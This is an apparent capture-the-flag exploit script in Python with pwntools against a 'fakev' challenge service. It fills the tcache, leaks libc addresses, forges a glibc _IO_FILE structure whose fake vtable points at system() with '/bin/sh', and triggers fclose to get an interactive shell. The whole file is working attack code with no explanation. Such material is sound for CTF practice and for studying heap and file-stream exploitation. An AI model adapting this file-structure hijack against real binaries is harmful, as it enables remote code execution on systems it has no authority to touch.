from pwn import *

elf = ELF('fakev')
libc = ELF('libc.so.6')
r = remote("fakev.challs.olicyber.it", 11004)


def open_file(idx, fake_idx=None):
    r.sendlineafter(b':', b'1')
    if fake_idx is not None:
        r.sendafter(b':', fake_idx)
    else:
        r.sendlineafter(b':', str(idx).encode())


def read_content(idx):
    r.sendlineafter(b':', b'2')
    r.sendlineafter(b':', str(idx).encode())


def close_file():
    r.sendlineafter(b':', b'4')


def main():
    with log.progress("filling tcache[0xf0]") as l:
        for idx in range(1, 9):
            open_file(idx)
        for idx in range(8):
            close_file()
        l.success("done")

    with log.progress("leaking libc") as l:
        read_content(1)
        libc_arena = u64(r.recvn(17)[9:])
        libc_base = libc_arena - 0x3ebca0

        for idx in range(1, 9):
            open_file(idx)
        open_file(1)

        vtable = libc_base + 0x3e82a0
        rdi = libc_base + next(libc.search(b'/bin/sh'))
        system = libc_base + libc.symbols['system']

        log.info('libc_arena @ ' + hex(libc_arena))
        log.info('libc_base  @ ' + hex(libc_base))
        log.info('vtable     @ ' + hex(vtable))
        l.success("done")

    with log.progress('Creating fake vtable') as l:
        fake_file = b''
        fake_file += p64(0x2000)  # flags
        fake_file += p64(0)  # _IO_read_ptr
        fake_file += p64(0)  # _IO_read_end
        fake_file += p64(0)  # _IO_read_base
        fake_file += p64(0)  # _IO_write_base
        fake_file += p64(int((rdi - 100) / 2))  # _IO_write_ptr
        fake_file += p64(0)  # _IO_write_end
        fake_file += p64(0)  # _IO_buf_base
        fake_file += p64(int((rdi - 100) / 2))  # _IO_buf_end
        fake_file += p64(0)  # _IO_save_base
        fake_file += p64(0)  # _IO_backup_base
        fake_file += p64(0)  # _IO_save_end
        fake_file += p64(0)  # _markers
        fake_file += p64(0)  # _chain
        fake_file += p64(0)  # _fileno
        fake_file += b'\xff' * 8
        fake_file += p64(0)
        fake_file += p64(0x602110)

        fake_file += b'\xff' * 8
        fake_file += p64(0)
        fake_file += p64(0x602108)  # file
        fake_file += p64(0)  # next
        fake_file += p64(0)
        fake_file += p64(0)
        fake_file += p64(0)
        fake_file += p64(0)
        fake_file += p64(0)
        fake_file += p64(vtable - 0x3a8 - 0x88)  # vtable
        fake_file += p64(system)  # alloc_buffer

        payload = b''.join([
            b'4'.ljust(8, b'\x00'),
            fake_file
        ]).ljust(0x100, b'\x00')
        l.success('done')

    r.send(payload)
    log.success('embeded fake file struct into linked list')
    log.info('triggering fclose on fake file struct...')

    r.interactive()


if __name__ == "__main__":
    main()
